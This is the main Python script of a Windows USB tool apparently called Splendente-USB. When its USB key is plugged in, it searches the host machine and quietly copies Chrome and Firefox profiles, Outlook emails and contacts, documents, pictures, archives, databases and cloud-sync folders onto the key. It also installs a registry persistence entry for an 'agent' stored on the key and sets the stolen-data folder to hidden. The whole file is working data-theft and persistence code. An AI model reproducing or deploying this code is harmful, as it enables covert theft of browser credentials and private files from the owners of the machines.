 # -*- coding: utf-8 -*-

"""

                                                                                                                                            
 @@@@@@   @@@@@@@   @@@       @@@@@@@@  @@@  @@@  @@@@@@@   @@@@@@@@  @@@  @@@  @@@@@@@  @@@@@@@@             @@@  @@@   @@@@@@   @@@@@@@   
@@@@@@@   @@@@@@@@  @@@       @@@@@@@@  @@@@ @@@  @@@@@@@@  @@@@@@@@  @@@@ @@@  @@@@@@@  @@@@@@@@             @@@  @@@  @@@@@@@   @@@@@@@@  
!@@       @@!  @@@  @@!       @@!       @@!@!@@@  @@!  @@@  @@!       @@!@!@@@    @@!    @@!                  @@!  @@@  !@@       @@!  @@@  
!@!       !@!  @!@  !@!       !@!       !@!!@!@!  !@!  @!@  !@!       !@!!@!@!    !@!    !@!                  !@!  @!@  !@!       !@   @!@  
!!@@!!    @!@@!@!   @!!       @!!!:!    @!@ !!@!  @!@  !@!  @!!!:!    @!@ !!@!    @!!    @!!!:!    @!@!@!@!@  @!@  !@!  !!@@!!    @!@!@!@   
 !!@!!!   !!@!!!    !!!       !!!!!:    !@!  !!!  !@!  !!!  !!!!!:    !@!  !!!    !!!    !!!!!:    !!!@!@!!!  !@!  !!!   !!@!!!   !!!@!!!!  
     !:!  !!:       !!:       !!:       !!:  !!!  !!:  !!!  !!:       !!:  !!!    !!:    !!:                  !!:  !!!       !:!  !!:  !!!  
    !:!   :!:        :!:      :!:       :!:  !:!  :!:  !:!  :!:       :!:  !:!    :!:    :!:                  :!:  !:!      !:!   :!:  !:!  
:::: ::    ::        :: ::::   :: ::::   ::   ::   :::: ::   :: ::::   ::   ::     ::     :: ::::             ::::: ::  :::: ::    :: ::::  
:: : :     :        : :: : :  : :: ::   ::    :   :: :  :   : :: ::   ::    :      :     : :: ::               : :  :   :: : :    :: : ::   
                                                                                                                                            
                                                                                                             

"""

#---------------------------------------------------------- [Lib] -----------------------------------------------------------#

import win32api
import win32con
import os
import logging
import re
import glob
import shutil
import sys

from core.splendente_dirs import Directories
from core.splendente_conf import Conf
from core.splendente_utils import Date, SmallSize, MediumSize, HighSize, BigSize
from core.splendente_mount import TargetMount, UsbMount
from core.splendente_copy import Copy
from core.splendente_persistence import Persistence
from core.splendente_error import ERROR_FILE_EMPTY, ERROR_FILE_NOT_FOUND, ERROR_BAD_ARGUMENTS, ERROR_BAD_ENVIRONMENT,\
                                ERROR_INVALID_DRIVE, ERROR_PATH_NOT_FOUND, EXIT_SUCCESS

#--------------------------------------------------------- [Global] ---------------------------------------------------------#

PLATFORM = sys.platform

#---------------------------------------------------------- [Main] ----------------------------------------------------------#

def main():
    if PLATFORM == "win32":
        # -- Check if USB key (USB_DATA) is mounted -- #
        usbMount        = UsbMount()
        usbMountLetter  = usbMount.SearchUsbMountLetter()

        if usbMountLetter != None:
            # -- Check if log file is available on USB key -- #
            if os.path.exists("{0}\\log\\splendente.log".format(usbMountLetter)) == True:
                # -- Define log file -- #
                logFile = "{0}\\log\\splendente.log".format(usbMountLetter)
                logging.basicConfig(
                                    filename=logFile,
                                    level=logging.DEBUG,
                                    format="%(name)s - %(levelname)s -> %(message)s"
                                    )

                # -- Delete old data in log file on USB key --#
                open(logFile, "w").close()
                if os.path.getsize(logFile) == 0:
                    logging.info("Old {0} -> deleted".format(logFile))

                # -- Check if conf file is available on USB key -- #
                if os.path.exists(usbMountLetter + "\\conf" + "\\splendente.ini") == True:
                    confUsbDirectory = usbMountLetter + "\\conf" + "\\splendente.ini"
                    # --- Name of folder that will contain all data in USB key --- #
                    dataUsbDirectory = "{0}\\data_{1}".format(usbMountLetter, Date())
                    os.makedirs(dataUsbDirectory)

                    # -- Check if data folder is available on USB key -- #    
                    if os.path.exists(dataUsbDirectory) == True:

                        # --- Found directories on target --- #
                        targetMount         = TargetMount()
                        targetMountLetter   = targetMount.SearchPartitionsMount()
                        conf                = Conf()
                        directories         = Directories()

                        directoriesFound = directories.Search(conf.Directories(confUsbDirectory),"Target",targetMountLetter, usbMountLetter)
                        if directoriesFound != ERROR_BAD_ARGUMENTS:
                            for i in directoriesFound:
                                if i != None:
                                    logging.info("Found : {0}".format(i))
                                else:
                                    continue
                        else:
                            sys.exit(ERROR_BAD_ARGUMENTS)

                        # --- Create folders in USB that will found on target --- #
                        usbDirectories = directories.Search(conf.Directories(confUsbDirectory),"USB", targetMountLetter, usbMountLetter)
                        if usbDirectories != ERROR_BAD_ARGUMENTS:
                            for i in usbDirectories:
                                if i != None:
                                    os.makedirs("{0}\\{1}".format(dataUsbDirectory, i))
                                else:
                                    continue
                        else:
                            sys.exit(ERROR_BAD_ARGUMENTS)

                        # --- Check if agent directory is available on USB key --- #
                        if os.path.exists("{0}\\agent".format(usbMountLetter)) == True:
                            # --- Files copy from USB key --- #
                            agentUsbDirectory = "{0}\\agent".format(usbMountLetter)
                            try:
                                persistence = Persistence()
                                if (persistence.Registry(agentUsbDirectory) != EXIT_SUCCESS):
                                    logging.error("Persistence : Adding registry key -> Failed")
                                else:
                                    logging.info("Persistence : Adding registry key -> Successful")
                            except Exception as e:
                                logging.error(e)
                                pass         
                        else:
                            logging.info("No {0}\\agent directory".format(usbMountLetter))

                        # -- Files copy from target -- #
                        copy = Copy()
                        for usbFolder in usbDirectories:
                            for targetPath in directoriesFound:
                                # -- Folders of user profile and other partitions mounted -- #
                                if usbFolder in targetPath:
                                    usbFolderFound = dataUsbDirectory + "\\" + usbFolder

                                    if re.match(r"^Chrome$", usbFolder):
                                        copy.MediumDepth(conf.ChromeBrowser(confUsbDirectory), usbFolderFound, targetPath, BigSize())

                                    elif re.match(r"^Firefox$", usbFolder):
                                        copy.MediumDepth(conf.FirefoxBrowser(confUsbDirectory), usbFolderFound, targetPath, BigSize())

                                    elif re.match(r"(^Outlook$)|(^Contacts$)", usbFolder):
                                        copy.MediumDepth(conf.Emails(confUsbDirectory), usbFolderFound, targetPath, MediumSize())

                                    elif re.match(r"^Pictures$", usbFolder):
                                        copy.HighDepth(conf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())

                                    elif re.match(r"(^Documents$)|(^Downloads$)|(^Desktop$)|(^Dropbox$)|(^OneDrive$)", usbFolder):
                                        copy.HighDepth(conf.Docs(confUsbDirectory), usbFolderFound, targetPath, HighSize())
                                        copy.HighDepth(conf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                                        copy.HighDepth(conf.Compress(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                                        copy.HighDepth(conf.Databases(confUsbDirectory), usbFolderFound, targetPath, BigSize())
                                        
                                    elif re.match(r"^\D?$", usbFolder) and os.environ["USERPROFILE"] not in targetPath:
                                        copy.MediumDepth(conf.Emails(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                                        copy.HighDepth(conf.Docs(confUsbDirectory), usbFolderFound, targetPath, HighSize())
                                        copy.HighDepth(conf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                                        copy.HighDepth(conf.Compress(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                                        copy.HighDepth(conf.Databases(confUsbDirectory), usbFolderFound, targetPath, BigSize())
                                        copy.HighDepth(conf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                                    else:
                                        continue

                                    if glob.glob("{0}\\*.*".format(usbFolderFound)) != []:
                                        logging.info("Copy {0} -> Successful".format(usbFolderFound))
                                    else:
                                        # -- Remove folder empty in USB key -- #
                                        try:
                                            shutil.rmtree(usbFolderFound)
                                            if os.path.exists(usbFolderFound) == False:
                                                logging.info("Remove {0} -> Failed (No data)".format(usbFolderFound))
                                        except Exception:
                                            pass

                                # -- User profile Only -- #
                                elif re.match(r"^WindowsHome$", usbFolder) and targetPath == os.environ["USERPROFILE"]:
                                    usbFolderFound = dataUsbDirectory + "\\" + usbFolder
                                    copy.SmallDepth(conf.Databases(confUsbDirectory), usbFolderFound, targetPath, BigSize())
                                    copy.SmallDepth(conf.Programs(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                                    copy.SmallDepth(conf.Docs(confUsbDirectory), usbFolderFound, targetPath, HighSize())
                                    copy.SmallDepth(conf.Compress(confUsbDirectory), usbFolderFound, targetPath, HighSize())
                                    copy.SmallDepth(conf.Emails(confUsbDirectory), usbFolderFound, targetPath, MediumSize())

                                    if glob.glob("{0}\\*.*".format(usbFolderFound)) != []:
                                        logging.info("Copy {0} -> Successful".format(usbFolderFound))
                                    else:
                                        # -- Remove folder empty in USB key -- #
                                        try:
                                            shutil.rmtree(usbFolderFound)
                                            if os.path.exists(usbFolderFound) == False:
                                                logging.info("Remove {0} -> Failed (No data)".format(usbFolderFound))
                                        except Exception:
                                            pass
                                else:
                                    continue

                        # -- Set the folder in hidden mode containing the copy files -- #
                        win32api.SetFileAttributes(dataUsbDirectory, win32con.FILE_ATTRIBUTE_HIDDEN)
                        
                    else:
                        logging.error("No {0}\\data directory".format(usbMountLetter))
                else:
                    logging.error("No {0}\\conf\\splendente.ini".format(usbMountLetter))
                    sys.exit(ERROR_FILE_NOT_FOUND)
            else:
                sys.exit(ERROR_PATH_NOT_FOUND)
        else:
            sys.exit(ERROR_INVALID_DRIVE)
    else:
        sys.exit(ERROR_BAD_ENVIRONMENT)

#---------------------------------------------------------------------------------------------------------------------------#

#---------------------------------------------------------------------------------------------------------------------------#

if __name__ == '__main__':
    main()
